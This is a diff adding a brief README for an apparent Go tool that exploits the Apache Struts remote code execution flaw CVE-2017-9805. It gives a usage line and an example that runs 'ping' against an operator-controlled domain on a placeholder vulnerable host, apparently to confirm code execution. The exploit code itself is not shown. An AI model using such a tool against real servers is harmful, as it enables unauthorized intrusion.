@@ -1,0 +1,14 @@
+### Description
+
+Apache Struts RCE tool for CVE 2017-9805
+
+### Usage
+
+```
+go run main.go -u target -c command
+```
+
+example:
+```
+go run main.go -u http://vuln.domain.tld -c "ping -n 3 my.domain.tld"
+```
